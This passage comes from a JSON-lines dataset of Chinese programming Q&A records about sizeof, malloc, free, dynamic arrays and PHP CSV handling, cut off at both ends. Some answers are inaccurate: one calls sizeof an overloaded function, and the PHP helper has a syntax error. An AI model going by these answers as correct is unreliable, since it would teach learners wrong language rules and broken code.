   a.size = init_size;\n    a.array = (", "int", "*)", "malloc", "(", "sizeof", "(", "int", ") * a.size);\n    ", "return", " a;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;您可以看看一看您的完整代码里有没有改变了变量a的地址值&amp;#xff0c;如果a的地址值改变后&amp;#xff0c;再释放空间是不行的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C怎么使用malloc函数和free函数", ["最近做测试，有点不理解，在这请假", "我用malloc申请内存块， 然后 在代码后端 free ，并设置NULL，", "编译，运行没有任何问题，", "但用vglgrind 来检检测， 告诉我有内存泄露。  并且所错误应用了free，", "这是为什么？ 在main里不能使用 free吗？，编译也没报错呀。", "\n", "\n", "int", " ", "main", "(", "int", " argc ", "char", " **argv)", "{\n", "char", " *a=(", "char", " *)", "malloc", "(", "sizeof", "(", "char", ")*", "100", ");\n", "if", "(!a)\n{\n", "exit", "(", "-1", ");\n}\n", "memset", "(a,", "0", ",", "sizeof", "(", "char", ")*", "100", ");\n\n.....\n\n...\n", "free", "(a);\na=", "NULL", ";\n", "\n", "valgrind返回错误是", "\n", "Invalid free()/delete/delete[]/realloc()", ".....", "....", "LEAK SUMMARY:", "  definitely loast: 100bytes in 1 blocks", "\n", "这是为什么？ 急。"]], "Tag": "程序设计"}
{"Answer": "从文件读取的数据有可能是编码的问题，改变一下编码试试看", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么我的string类型输出是乱码，而内存里面存着是正确的", ["部分代码如下", "\nstring cn;", "\n\n", "ifstream infile(\"encode.lzw\", ios::binary);", "\n    infile.read((char*)&stud, sizeof(stud));", "\n    for (int i = 0; i<8; i++)", "\n    {", "\n        cn += char((int)stud / 128);", "\n        *stud << 1;", "\n    }", "\n    infile.close();", "\n\n", "for (int i = 0; i < b; i++)\n        cout << (char)cnm[i];\n        打错了不是cnm，是cn\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof()得到类型字符大小&amp;#xff0c;然后%d是以十进制数输出&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言中的问题,有人能够解答一下吗", ["\n", "#", "include", " ", "<stdio.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n    \n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "char", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "short", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "int", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "long", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "long", " ", "long", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "float", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "double", "));\n\n    ", "return", " ", "0", ";\n}\n", "\n", "为什么这里printf函数中要用%d"]], "Tag": "程序设计"}
{"Answer": "for(int j=i;j if(a[j]&gt;a[j+1])\r\n这里完全不对\r\n\r\nvoid min(int);\r\n这是函数定义，不是调用\r\n\r\nfree(p);\r\np没有初始化，你free肯定不行", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在用devcpp编动态内存的时候总是出现这样的错误：[Error] ld returned 1 exit status 这是怎么回事啊，要怎么解决？", ["具体的程序如下", "\n#include", "\n#include", "\nvoid min(int)", "\n{   int *p;", "\nextern int n;", "\nscanf(\"%d\",&n);", "\np=(int *)malloc(n*sizeof(int));", "\n    int a[n];   int temp;", "\n for(int i=0;i<=n-2;i++)", "\n  {", "\n    for(int j=i;j\n    if(a[j]>a[j+1])", "\n    {", "\n       temp=a[j];", "\n      a[j]=a[j+1];", "\n      a[j+1]=temp;  }", "\n  }", "\n for(int k=0;k<=n-2;k++)", "\n printf(\"%d,\",a[k]);", "\n printf(\"%d\",a[n-1]);", "\n } ", "\nint main()", "\n{", "\n\n", "int *p,n;", "\nint i;int a[n];", "\nfor(i=0;i<n;i++)", "\nscanf(\"%d\",&a[i]);", "\nvoid min(int);", "\nfree(p);", "\nreturn 1; }"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这是我写的顺序表&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; overflow -1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; ok 1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;error&lt;/span&gt; 0&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; maxsize 16&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; increment 10&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; status;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; elemtype;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt;\n{\n    elemtype *elem;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; length;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; listsize;\n} sqlist;\n\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;initlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L)&lt;/span&gt;\n&lt;/span&gt;{\n    L.elem &amp;#61; (elemtype *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(maxsize * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!L.elem)\n        &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(overflow);\n    L.length &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    L.listsize &amp;#61; maxsize;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;insertlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i, elemtype e)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (i &amp;lt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; || i &amp;gt; L.length)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    elemtype *p;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (L.length &amp;gt;&amp;#61; L.listsize)\n    {\n        p &amp;#61; (elemtype *)&lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;(L.elem, (L.listsize &amp;#43; increment) * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype));\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!p)\n            &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(overflow);\n        L.elem &amp;#61; p;\n        L.listsize &amp;#43;&amp;#61; increment;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; L.length - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; j &amp;gt;&amp;#61; i - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; --j)\n        L.elem[j &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; L.elem[j];\n    L.elem[j &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; e;\n    L.length&amp;#43;&amp;#43;;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist L)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; L.length; i&amp;#43;&amp;#43;)\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, L.elem[i]);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n}\n\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;dellist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i, elemtype &amp;amp;e)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (i &amp;lt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; || i &amp;gt; L.length)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    e &amp;#61; L.elem[i - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;];\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; i; j &amp;lt; L.length; j&amp;#43;&amp;#43;)\n        L.elem[j - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; L.elem[j];\n    --L.length;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    sqlist LL;\n    elemtype x;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; r, i;\n\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!&lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(LL)) &lt;span class=\"hljs-comment\"&gt;//初始化&lt;/span&gt;\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;; i&amp;#43;&amp;#43;)\n        LL.elem[i] &amp;#61; i * &lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;;\n    LL.length &amp;#43;&amp;#61; &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;;\n\n    &lt;span class=\"hljs-comment\"&gt;//printf(&amp;#34;value index--&amp;gt;&amp;#34;);  //插入&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//scanf(&amp;#34;%d %d&amp;#34;, &amp;amp;x, &amp;amp;r);&lt;/span&gt;\n    x &amp;#61; &lt;span class=\"hljs-number\"&gt;188&lt;/span&gt;, r &amp;#61; &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;insertlist&lt;/span&gt;(LL, r, x);\n\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(LL);\n\n    &lt;span class=\"hljs-comment\"&gt;//printf(&amp;#34;index--&amp;gt;&amp;#34;);  //删除&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//scanf(&amp;#34;%d&amp;#34;, &amp;amp;r);&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;dellist&lt;/span&gt;(LL, r, x);\n\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(LL);\n\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;xiaoxiaoran&amp;#34;&lt;/span&gt;);\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请教一下这个print函数为什么无法运行", ["\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "#", "define", " InitSize 20", "\n", "#", "define", " ERROR 0", "\n", "#", "define", " OK 1", "\n", "#", "define", " OVERFLOW -2", "\n", "typedef", " ", "int", " ElemType;\n\n", "typedef", " ", "struct", "{\n    ElemType *elem;                ", "//指向数据元素的基地址", "\n    ", "int", " length,MaxSize;        ", "//线性表的当前长度和最大容量 ", "\n}Sqlist;\n\n", "//顺序表的创建 ", "\n", "void", " ", "InitList", "(Sqlist *L)", "\n", "{\n    (*L).elem=(", "int", "*)", "malloc", "(InitSize*", "sizeof", "(", "int", "));            ", "//给顺序表申请内存 ", "\n    (*L).length=", "0", ";                    \n    (*L).MaxSize=InitSize;                ", "//初始化最大容量为已申请内存容量 ", "\n } \n \n", "//顺序表的初始化", "\n", "void", " ", "InputList", "(Sqlist *L)", "\n", "{\n    ", "int", " N;\n    ", "int", " i=", "0", ";\n    ", "printf", "(", "\"Enter the length of the Order table you want:\\n\"", ");\n    ", "scanf", "(", "\"%d\"", ",&N);\n    ", "printf", "(", "\"input data:\\n\"", ");\n    ", "while", "(N)\n    {\n        ", "scanf", "(", "\"%d\"", ",&(*L).elem[i]);\n        i++;\n        N--; \n    }\n } \n \n", "//增加顺序表长度 ", "\n", "void", " ", "IncreaseSize", "(Sqlist *L,", "int", " len)", "            ", "//增加长度 ", "\n", "{\n    ElemType *temp=(*L).elem;\n    ", "int", " i;\n    (*L).elem=(ElemType*)", "malloc", "(((*L).length+len)*", "sizeof", "(ElemType));        \n    ", "for", "(i=", "0", " ; i<(*L).length ; i++)\n    {\n        (*L).elem[i]=temp[i];            ", "//将数据复制到新区域 ", "\n    }\n    (*L).MaxSize=(*L).length+len;\n    ", "free", "(temp);                ", "//释放temp所指向的内存区域 ", "\n}\n\n", "//顺序表的打印 ", "\n", "void", " ", "PrintList", "(Sqlist L)", "\n", "{\n    ", "int", " i;\n    ", "printf", "(", "\"text\\n\"", ");\n    ", "for", "(i=", "0", " ; i<L.length", "-1", " ; i++){\n        ", "printf", "(", "\"elem[%d]=%d\\n\"", ",i,L.elem[i]);\n    }", "printf", "(", "\"text2\\n\"", ");\n}\n\n", "int", " ", "main", "()", "\n", "{\n    Sqlist L;\n    ", "InitList", "(&L);\n    ", "InputList", "(&L);\n    ", "Empty", "(L);\n    ", "printf", "(", "\"Print Order table\\n\"", ");\n    ", "PrintList", "(L);\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组名本质上是数组的首地址&amp;#xff0c;是一个常量&amp;#xff0c;用sizeof计算时&amp;#xff0c;计算是以这个首地址开始的数组元素的字节数&amp;#xff0c;如果加上&amp;amp;即取地址操作就是该地址的字节&amp;#xff0c;这个涉及sizeof函数的重载操作&amp;#xff0c;可以具体查看函数的源码深入理解。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言数组名代表的意义", ["数组名代表首元素地址还是整个数组呢？还是说在不同情况下代表不同的意义呢？比如*a = arr，arr代表首元素地址，而sizeof（arr），计算的是整个数组所占字节而不是首元素地址所占字节。"]], "Tag": "程序设计"}
{"Answer": "为每一列分配内存的时候，for(i=0;i&lt;n;i++)这里的n应该改为m\r\n\r\n另外，使用rand函数前应该先用srand提供种子，最好再调用一下rand使数据更随机", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["动态内存的二维数组，随机赋值时行大于列即出错，反之无问题", ["#include", "\n#include", "\n\n", "int main(void)", "\n{", "\n    int i,j,n,m,**array,max;", "\n    printf(\"input the row and column of your array:\\n\");", "\n    scanf(\"%d%d\",&m,&n);", "\n    array=malloc(m*sizeof(int*));", "\n    for(i=0;i<n;i++)", "\n    {", "\n        array[i] =malloc(n*sizeof(int));", "\n    } ", "\n    printf(\"$$$$$\");", "\n    system(\"pause\");", "\n    for(i=0;i<m;i++)", "\n    {", "\n        for(j=0;j<n;j++)", "\n        {", "\n            array[i][j]=rand();", "\n            printf(\"i%d j%d\\n\",i,j);", "\n        }", "\n    }", "\n\n", "max=array[0][0];\nfor(i=0;i<m;i++)\n{\n    for(j=1;j<n;j++)\n    {\n        if(max<array[i][j])\n        max=array[i][j];\n    }\n}\n    for(i=0;i<m;i++)\n{\n    for(j=1;j<n;j++)\n    {\n        if(max==array[i][j])\n        printf(\"the position of the max : row=%d  column=%d   \",i,j);\n    }\n}\nfor(i=0;i<m;i++)\n{\n    free(array[i]);\n } \n free(array);\nreturn 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof() ,后面是有括号的&amp;#xff0c;修改如下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;int &amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;short int &amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;short&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;long int&amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;long long int&amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;float&amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;float&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;double&amp;#61; %d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;long double&amp;#61;%d\\n&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;));\n    \n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["不明白哪里出错了，指点指点", ["#include<stdio.h>", "\n", "int main()", "{", "    printf(\"int =%d\\n\",sizeof int);", "    printf(\"short int =%d\\n\",sizeof short int);", "    printf(\"long int=%d\\n\",sizeof long int);", "    printf(\"long long int=%d\\n\",sizeof long long int);", "    printf(\"float=%d\\n\",sizeof float);", "    printf(\"double= %d\\n\",sizeof double);", "    printf(\"long double=%d\\n\",sizeof long double);", "\n", "return", " ", "0", ";\n", "\n", "}    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;A呀&amp;#xff0c;A出来的是P[]数组的长度&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["z这个咋做，选啥，谢谢", ["设有定义:char p[]={'1','2','3'},*q=p;,以下不能计算出一个char型数据所占字节数的表达式是().", "\n\n", " ", "\n\n", "A.sizeof(p)", "\n\n", "B.sizeof(char)", "\n\n", "C.sizeof(p[0])", "\n\n", "D.sizeof(*q)"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你说的和第13题有一毛钱关系吗&amp;#xff1f;什么Aint型&amp;#xff0c;Bdouble型&amp;#xff1f;啥意思&amp;#xff1f;&lt;br /&gt;13题选B&amp;#xff0c;因为%2d表示接收两个数字。a就是87&amp;#xff0c;然后后面的由%f接收&amp;#xff0c;遇到空格会终止&amp;#xff0c;所以b是6&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请帮我看一下图片的问题！13题", ["看图片！13题", "sizeof是计算当前数据类型所占的字节长度。", "A是int型，占四个字节，所以s=4,另一个B是double型，占8个字节，所以t=8"]], "Tag": "程序设计"}
{"Answer": "int sizeOfSubstr = strlen(substr);\r\n             int sizeOfStr = strlen(str);\r\n这样就可以了，亲自调试通过。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用c++写了一个函数判断一个数组是否包含另一个数组 但是总是返回-1 请大神们帮忙看看错在哪里", ["int substr_index( const char substr[], const char str[])", "\n{", "\n    int flag = -1;", "\n    int sizeOfSubstr = sizeof(substr)/sizeof(char);", "\n    int sizeOfStr = sizeof(str)/sizeof(char);", "\n    for (int i = 0; i < sizeOfStr; i++)", "\n    {", "\n        if (str[i] == substr[0])", "\n        {", "\n            flag = i;", "\n            for (int j = 1; j < sizeOfSubstr; j++)", "\n            {", "\n                if (str[i + j] != substr[j])", "\n                {", "\n                    flag = -1;", "\n                    break;", "\n                }", "\n            }", "\n        }", "\n        if (flag == i)", "\n        break;", "\n    }", "\n    return flag;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;If it's only 2mb, maybe read the entire file into memory and then write out a new file (overwriting the previous file). Here are some helper functions to help you read and write the file, and I'm certain you're proficient in editing the resulting array:&lt;/p&gt;\n\n&lt;pre class=\"lang-php prettyprint-override\"&gt;&lt;code&gt;/**\n  * Reads a file into an array\n  *\n  * @param $FILE string the file to open\n  *\n  * @return $lines The Lines of the file as an array\n  */\npublic static function readFile($FILE) {\n\n    $lines = array(); // the array to store each line of the file in\n\n    $handle = fopen($FILE, \"r\"); \n    if ($handle) { \n\n        // $FILE successfully opened for reading, \n\n        while (($line = fgets($handle)) !== false) {\n            $lines[] = $line; //add each line of the file to $lines\n        } \n\n    } else {\n        throw new Exception(\"error opening the file...\");\n    } \n\n    fclose($handle); // close the file\n\n    return $lines; // return the lines of the file as an array\n}\n\n /**\n   * Writes the $lines of a file into $FILE\n   *\n   * @param $FILE string The file to write\n   * @param $lines array An array containing the lines of the file\n   *\n   * @return $result int|NULL The number of bytes written, or null on failure. See: php.net/fwrite#refsect1-function.fwrite-returnvalues\n   */\npublic static writeFile($FILE, $lines) {\n\n    // Add newline at the end of each line of the array\n    // output is now a single string which we will write in one pass \n    // (instead of line-by-line)\n    $output = implode(\"\n\", $lines);\n\n    $handle = fopen($FILE, \"w+\"); \n    if ($handle) { \n\n        // $FILE successfully opened for writing, write to the file\n        $result = fwrite($handle, $output);\n\n    } else {\n        throw new Exception(\"error opening the file...\");\n    } \n\n    fclose($handle); // close the file\n\n    return $result; // The number of bytes written to the file, or NULL on failure\n}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["替换PHP中的CSV行，内存错误", ["\n\n", "I have a csv file that is 2Mb size, and has pipe delimiter. I would like to take the first row and replace its data then resave the file. Here is what I did :", "\n\n", "//Creating a new first row with the modified data.\n$file = fopen($path,\"r\");//$path is where the file is located : outputs/my_file.csv\n$size = filesize($path);\n$firstLine = fgetcsv(fopen($path,\"r\")); //$firstLine has all the data of the first row as array\nfclose($file);\n$firstLine = explode(\"|\", $firstLine[0]);//To get each column row\n$newHeader = array();\n    for($i = 0; $i<sizeof($firstLine ); $i++){\n        if($i == 4){\n            array_push($newHeader, \"modified column in row 1 \");//Only column 4 in row 1 is modified\n        }else{\n            array_push($newHeader, $firstLine [$i]);\n        }\n    }\n$Header = implode(\"|\", $newHeader);\n\n//Creating the new csv file\n$row = 0;\n    while (($data = fgetcsv(fopen($path,\"r\"), \"|\")) !== false) {\n        if($row == 0){\n            $data[0] = $Header;\n        }\n        $newCsvData[] = $data;\n    }\n    return $newCsvData; //I wanted to display the new content of the csv before saving it\n", "\n\n", "This code should print the new content of the csv file that I will store but I get an error : Allowed memory size of 536870912 bytes exhausted (tried to allocate 332 bytes)    How can I do that in a very fast way ? the file is about 19122 row.", "\n\n", "Thanks", "\n    "]], "Tag": "程序设计"}
{"Answer": "不会报错把，麻烦把错误信息贴一下。不应该报错的\r\n\r\n你先把下面的程序编译一下，如果没报错就不是new的问题\r\n```\r\n#include &lt;iostream&gt;\r\n#include &lt;string.h&gt;\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\t//申请\r\n\tdouble ** a = new double*[5];\r\n\tfor(int i = 0; i&lt;5; ++i)\r\n\t{\r\n\t\ta[i] = new double[6];\r\n\t\tmemset(a[i], 0, sizeof(double)*6);\r\n\t}\r\n\r\n\t//赋值\r\n\tfor(int i = 0; i&lt;5; ++i)\r\n\t\tfor(int j = 0; j &lt; 6; ++j)\r\n\t\t\ta[i][j] = i*j*1.3;\r\n\r\n\t//输出\r\n\tfor(int i = 0; i&lt;5; ++i)\r\n\t{\r\n\t\tfor(int j = 0; j &lt; 6; ++j)\r\n\t\t\tcout&lt;&lt;a[i][j]&lt;&lt;\" \";\r\n\t\tcout&lt;&lt;endl;\r\n\t}\r\n\r\n\t//删除\r\n\tfor(int i = 0; i&lt;5; ++i)\r\n\t{\r\n\t\tdelete[] a[i]; \r\n\t}\r\n\tdelete[] a;\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问为什么用new建立动态二维数组就会报错，用malloc就不会报错。", ["请问为什么用注释掉的部分建立动态二维数组就会报错，用malloc就不会报错？", "\n\n", "void Matrix()\n{\n    int i;\n    //double** P_ca_x = new double* [Times];\n    //double** P_ca_y = new double* [Times];\n    //double** P_ca_z = new double* [Times];\n    //double** v_ca_x = new double* [Times];\n    //double** v_ca_y = new double* [Times];\n    //double** v_ca_z = new double* [Times];\n    //double** v_ca = new double* [Times];\n    P_ca_x = (double**)malloc(sizeof(double*) * Times);\n    P_ca_y = (double**)malloc(sizeof(double*) * Times);\n    P_ca_z = (double**)malloc(sizeof(double*) * Times);\n    v_ca_x = (double**)malloc(sizeof(double*) * Times);\n    v_ca_y = (double**)malloc(sizeof(double*) * Times);\n    v_ca_z = (double**)malloc(sizeof(double*) * Times);\n    v_ca = (double**)malloc(sizeof(double*) * Times);\n    for (i = 0; i < Times; i++)\n    {\n        //P_ca_x[i] = new double[Num];\n        //P_ca_y[i] = new double[Num];\n        //P_ca_z[i] = new double[Num];\n        //v_ca_x[i] = new double[Num];\n        //v_ca_y[i] = new double[Num];\n        //v_ca_z[i] = new double[Num];\n        //v_ca[i] = new double[Num];\n        P_ca_x[i] = 